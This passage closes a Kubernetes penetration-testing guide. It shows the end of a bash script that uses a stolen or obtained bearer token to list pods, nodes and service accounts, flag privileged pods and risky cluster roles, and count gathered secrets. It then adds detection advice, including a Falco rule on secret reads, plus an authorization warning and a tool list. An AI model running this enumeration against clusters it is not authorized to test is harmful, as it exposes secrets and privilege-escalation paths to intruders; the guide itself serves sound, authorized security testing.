  .metadata.name' "$OUTPUT_DIR/rbac/clusterroles.json" \
  > "$OUTPUT_DIR/rbac/dangerous-clusterroles.txt"

# 6. Pod analysis
echo "[*] Analyzing pods..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/pods > "$OUTPUT_DIR/pods/all-pods.json"

# Find privileged pods
jq -r '.items[] | select(
  .spec.securityContext.privileged == true or
  .spec.hostNetwork == true or
  .spec.hostPID == true
) | "\(.metadata.namespace)/\(.metadata.name)"' \
  "$OUTPUT_DIR/pods/all-pods.json" \
  > "$OUTPUT_DIR/pods/privileged-pods.txt"

# 7. Node information
echo "[*] Gathering node information..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/nodes > "$OUTPUT_DIR/nodes/nodes.json"

# 8. ServiceAccount enumeration
echo "[*] Enumerating service accounts..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/serviceaccounts \
  > "$OUTPUT_DIR/misc/serviceaccounts.json"

# 9. Generate report
echo "[*] Generating report..."
cat > "$OUTPUT_DIR/REPORT.md" <<EOREPORT
# Kubernetes Penetration Test Report
Generated: $(date)

## Summary
- Namespaces: $(wc -l < "$OUTPUT_DIR/misc/namespaces.txt")
- Secrets: $(find "$OUTPUT_DIR/secrets" -type f | wc -l)
- Privileged Pods: $(wc -l < "$OUTPUT_DIR/pods/privileged-pods.txt")

## Critical Findings

### Privileged Pods
\`\`\`
$(cat "$OUTPUT_DIR/pods/privileged-pods.txt")
\`\`\`

### Dangerous Cluster Roles
\`\`\`
$(cat "$OUTPUT_DIR/rbac/dangerous-clusterroles.txt")
\`\`\`

## Recommendations
1. Review RBAC configurations
2. Implement Pod Security Standards
3. Enable audit logging
4. Restrict privileged containers
5. Implement network policies

EOREPORT

echo "[*] Audit complete. Report saved to $OUTPUT_DIR/REPORT.md"
```

---

## Detection & Blue Team Considerations

### What Red Team Should Know About Detection

1. **Audit Logs**: All API requests are logged
   - Enable audit logging with `--audit-log-path`
   - Monitor for unusual API patterns

2. **Falco Rules**: Common runtime security tool
   ```yaml
   - rule: Unauthorized API Access
     condition: k8s_audit and ka.verb in (get, list) and ka.target.resource contains "secrets"
   ```

3. **Admission Controllers**: Block malicious resources
   - OPA/Gatekeeper policies
   - Pod Security Admission

4. **Network Monitoring**: East-west traffic analysis
   - Unusual pod-to-pod communication
   - Connections to API server

---

## Legal & Ethical Considerations

⚠️ **IMPORTANT**: This guide is for authorized security testing only.

- Obtain written authorization before testing
- Define scope and rules of engagement
- Document all activities
- Report findings responsibly
- Do not exfiltrate real customer data
- Restore systems to original state

---

## Additional Resources

- **Tools**:
  - `kubectl` - Official CLI
  - `kube-hunter` - Penetration testing tool
  - `kubeletctl` - Kubelet exploitation
  - `peirates` - Kubernetes pentesting framework
  - `kubeaudit` - Audit tool
  - `kube-bench` - CIS benchmark

- **References**:
  - Kubernetes RBAC documentation
  - CIS Kubernetes Benchmark
  - NSA/CISA Kubernetes Hardening Guide
  - OWASP Kubernetes Security Cheat Sheet


##
##
